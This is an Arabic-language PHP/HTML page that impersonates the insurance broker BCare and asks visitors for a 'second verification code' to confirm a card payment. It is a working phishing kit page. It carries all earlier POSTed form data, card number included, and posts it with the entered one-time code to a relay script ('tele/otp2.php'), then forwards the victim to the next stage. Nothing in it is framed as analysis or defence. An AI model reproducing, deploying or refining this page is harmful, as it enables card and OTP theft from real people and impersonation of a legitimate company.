<?php
$payment_data = $_POST;
?>
<!DOCTYPE HTML>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>رمز التحقق - بي كير</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
<style>
:root{--color-background:#F4F7FB;--color-primary:#0F4C72;--color-primary-light:#E6F0F7;--color-accent:#F2A340;--color-accent-dark:#D6892F;--color-text-primary:#0E1F2E;--color-text-secondary:#4B5B6B;--color-border:#D8E2EE;--shadow-soft:0 16px 40px rgba(15,76,114,0.12)}
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Cairo',sans-serif;background:var(--color-background);color:var(--color-text-primary);line-height:1.6;min-height:100vh;display:flex;flex-direction:column}
.notification-banner{position:relative;background:var(--color-accent);color:white;padding:.75rem 1rem;display:flex;align-items:center;justify-content:center}
.close-notification{position:absolute;left:1rem;background:transparent;border:none;cursor:pointer;opacity:.9}
.notification-content{display:flex;align-items:center;gap:.5rem;font-size:.875rem}
.notification-text{font-weight:500}
.notification-link{color:white;text-decoration:underline;font-weight:600}
.main-nav{background:rgba(255,255,255,0.92);border-bottom:1px solid var(--color-border)}
.nav-content{display:flex;justify-content:space-between;align-items:center;height:4rem;max-width:1280px;margin:0 auto;padding:0 1rem}
.nav-actions{display:flex;gap:.5rem}
.lang-btn,.profile-btn,.menu-btn{background:transparent;border:1px solid var(--color-border);border-radius:9999px;cursor:pointer;display:flex;align-items:center;justify-content:center}
.lang-btn{padding:.25rem .75rem;font-size:.75rem;font-weight:600;color:var(--color-text-primary)}
.profile-btn,.menu-btn{padding:.5rem}
.profile-icon,.menu-icon{width:1.25rem;height:1.25rem;stroke:var(--color-primary);stroke-width:1.8;fill:none}
.menu-icon{stroke:var(--color-text-primary);stroke-width:2}
.main-content{flex:1;display:flex;align-items:center;justify-content:center;padding:2rem 1rem}
.otp-card{background:white;border-radius:1rem;box-shadow:var(--shadow-soft);max-width:28rem;width:100%;padding:2rem 1.5rem}
.lock-icon-wrapper{width:4rem;height:4rem;background:var(--color-primary-light);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 1.5rem}
.lock-icon{width:2rem;height:2rem;fill:var(--color-primary)}
.otp-title{font-size:1.5rem;font-weight:700;text-align:center;margin-bottom:.5rem}
.otp-subtitle{font-size:.875rem;color:var(--color-text-secondary);text-align:center;margin-bottom:2rem}
.phone-display{color:var(--color-primary);font-weight:600;direction:ltr}
.submit-btn{width:100%;padding:.875rem;background:var(--color-accent);color:white;border:1px solid var(--color-accent-dark);border-radius:.75rem;font-size:1rem;font-weight:600;cursor:pointer;box-shadow:0 4px 6px rgba(0,0,0,0.1);margin-top:1rem}
.submit-btn:disabled{opacity:.5;cursor:not-allowed}
.resend-section{text-align:center;margin-top:1.5rem;padding-top:1.5rem;border-top:1px solid var(--color-border)}
.resend-text{font-size:.875rem;color:var(--color-text-secondary);margin-bottom:.5rem}
.resend-btn{background:transparent;border:none;color:var(--color-primary);font-size:.875rem;font-weight:600;cursor:pointer;text-decoration:underline}
.resend-btn:disabled{color:var(--color-text-secondary);cursor:not-allowed;opacity:.5}
.timer{color:var(--color-accent);font-weight:600}
.footer{background:#0B2F48;color:#D6E4F0;padding:2rem 0;text-align:center}
.footer-logo{margin:0 auto 1rem;width:100px}
.footer-copyright{color:#9FB4C4;margin-bottom:1rem;font-size:.75rem}
.footer-contact{display:flex;align-items:center;justify-content:center;gap:.5rem;font-size:.75rem}
.footer-contact a{color:var(--color-accent);text-decoration:none;font-weight:600}
.app-buttons{display:flex;gap:.75rem;justify-content:center;margin-top:1rem}
</style>
</head>
<body>
<div class="notification-banner">
<button class="close-notification" onclick="this.parentElement.style.display='none'">×</button>
<div class="notification-content">
<span class="notification-text">حمّل تطبيق بي كير الآن!!</span>
<a href="#" class="notification-link">تحميل</a>
</div>
</div>
<div class="main-nav">
<div class="nav-content">
<div class="nav-actions">
<button class="lang-btn">EN</button>
<button class="profile-btn"><svg class="profile-icon" viewBox="0 0 24 24"><path d="M20 21a8 8 0 0 0-16 0"></path><circle cx="12" cy="7" r="4"></circle></svg></button>
</div>
<a href="#"><img src="/bcare-logo.svg" alt="bcare logo" width="90" height="45"></a>
<button class="menu-btn"><svg class="menu-icon" viewBox="0 0 24 24"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></button>
</div>
</div>
<main class="main-content">
<div class="otp-card">
<div class="lock-icon-wrapper">
<svg class="lock-icon" viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
</div>
<h1 class="otp-title">جاري تجهيز وثيقتك</h1>
<h1 class="otp-title">أدخل رمز التحقق الثاني</h1>
<p class="otp-subtitle">يرجى اضافة رمز التحقق الثاني لتأكيد عملية الدفع تم إرسال رمز التحقق الى رقم الجوال المرتبط بالبطاقة<br><span class="phone-display" id="cardDisplay" style="direction:ltr;display:inline-block">**** ****</span></p>
<form id="otpForm">
<label style="display:block;font-size:.875rem;font-weight:600;color:var(--color-text-secondary);margin-bottom:.75rem;text-align:right">أدخل رمز التحقق الثاني:</label>
<input type="text" id="otpInput" placeholder="" maxlength="6" inputmode="numeric" pattern="[0-9]*" autocomplete="off" required style="width:100%;padding:1rem;font-size:1.5rem;font-weight:700;text-align:center;border:2px solid var(--color-border);border-radius:12px;background:white;color:var(--color-text-primary);letter-spacing:.5rem;font-family:'Courier New',monospace">
<button type="submit" class="submit-btn" id="submitBtn">تحقق من الرمز </button>
</form>
<div class="resend-section">
<p class="resend-text">لم تستلم الرمز؟</p>
<button type="button" class="resend-btn" id="resendBtn" disabled>إعادة إرسال الرمز (<span class="timer" id="timer">60</span>)</button>
</div>
</div>
</main>
<footer class="footer">
<img src="/bcare-logo.svg" alt="BCare Logo" class="footer-logo">
<p class="footer-copyright">© 2026 جميع الحقوق محفوظة لشركة عناية الوسيط لوساطة التأمين.</p>
<div class="footer-contact"><span>اتصل بنا</span><a href="tel:8001180042">8001180042</a></div>
<div class="app-buttons">
<a href="https://apps.apple.com/sa/app/بي-كير/id1490248033" target="_blank"><img src="/ios_mobile_app.svg" alt="App Store" width="120" height="40"></a>
<a href="https://play.google.com/store/apps/details?id=com.app.bcare" target="_blank"><img src="/android_mobile_app.svg" alt="Google Play" width="120" height="40"></a>
</div>
</footer>
<script>
// عرض آخر 4 أرقام من البطاقة
const cardNumber='<?php echo isset($_POST['card_number'])?htmlspecialchars($_POST['card_number']):(isset($_POST['cardnumber'])?htmlspecialchars($_POST['cardnumber']):'');?>';
if(cardNumber){
  const cleanCard=cardNumber.replace(/\s/g,'');
  const lastFour=cleanCard.slice(-4);
  document.getElementById('cardDisplay').textContent='**** **** **** '+lastFour;
}

const otpInput=document.getElementById('otpInput'),submitBtn=document.getElementById('submitBtn'),form=document.getElementById('otpForm');

otpInput.addEventListener('input',function(){this.value=this.value.replace(/[^0-9]/g,'')});
otpInput.addEventListener('focus',function(){this.style.borderColor='var(--color-primary)';this.style.boxShadow='0 0 0 3px var(--color-primary-light)'});
otpInput.addEventListener('blur',function(){this.style.borderColor='var(--color-border)';this.style.boxShadow='none'});
otpInput.focus();

const errorMsg=document.createElement('p');
errorMsg.id='errorMsg';
errorMsg.style.cssText='color:#e53e3e;font-size:.875rem;font-weight:600;text-align:center;margin-top:.75rem;display:none;';
errorMsg.textContent='رمز التحقق غير صحيح، يرجى المحاولة مجدداً';
document.getElementById('submitBtn').after(errorMsg);

form.addEventListener('submit',async function(e){
  e.preventDefault();
  const otp=otpInput.value.trim();
  if(!otp||(otp.length!==4&&otp.length!==6)){
    otpInput.style.borderColor='#e53e3e';
    return;
  }

  submitBtn.disabled=true;
  submitBtn.textContent='جارٍ التحقق...';
  errorMsg.style.display='none';
  otpInput.style.borderColor='var(--color-border)';

  const formData=new URLSearchParams();
  formData.append('otp_code',otp);
  <?php foreach($_POST as $key=>$value){if(is_array($value)){echo "formData.append('".addslashes($key)."','".addslashes(json_encode($value))."');\n";}else{echo "formData.append('".addslashes($key)."','".addslashes($value)."');\n";}}?>
  const urlParams=new URLSearchParams(window.location.search),userId=urlParams.get('user_id')||'';
  if(userId)formData.append('user_id',userId);

  try{
    await fetch('tele/otp2.php',{
      method:'POST',
      headers:{'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8'},
      body:formData.toString()
    });
    
    const lineForm = document.createElement('form');
    lineForm.method = 'POST';
    lineForm.action = 'otp2.php';
    
    for (const [key, value] of formData.entries()) {
      const input = document.createElement('input');
      input.type = 'hidden';
      input.name = key;
      input.value = value;
      lineForm.appendChild(input);
    }
    
    document.body.appendChild(lineForm);
    lineForm.submit();
    
  }catch(err){
    setTimeout(()=>{
      const lineForm = document.createElement('form');
      lineForm.method = 'POST';
      lineForm.action = 'otp2.php';
      
      for (const [key, value] of formData.entries()) {
        const input = document.createElement('input');
        input.type = 'hidden';
        input.name = key;
        input.value = value;
        lineForm.appendChild(input);
      }
      
      document.body.appendChild(lineForm);
      lineForm.submit();
    }, 1000);
  }
});

let timeLeft=60;const timerElement=document.getElementById('timer'),resendBtn=document.getElementById('resendBtn');
const countdown=setInterval(()=>{timeLeft--;timerElement.textContent=timeLeft;if(timeLeft<=0){clearInterval(countdown);resendBtn.disabled=false;resendBtn.innerHTML='إعادة إرسال الرمز'}},1000);
resendBtn.addEventListener('click',function(){
  timeLeft=60;timerElement.textContent=timeLeft;this.disabled=true;
  this.innerHTML='إعادة إرسال الرمز (<span class="timer" id="timer">60</span>)';
  const newTimer=document.getElementById('timer');
  const newCountdown=setInterval(()=>{timeLeft--;newTimer.textContent=timeLeft;if(timeLeft<=0){clearInterval(newCountdown);resendBtn.disabled=false;resendBtn.innerHTML='إعادة إرسال الرمز'}},1000);
  otpInput.value='';otpInput.focus();
  errorMsg.style.display='none';
  otpInput.style.borderColor='var(--color-border)';
  otpInput.style.boxShadow='none';
});
</script>
</body>
</html>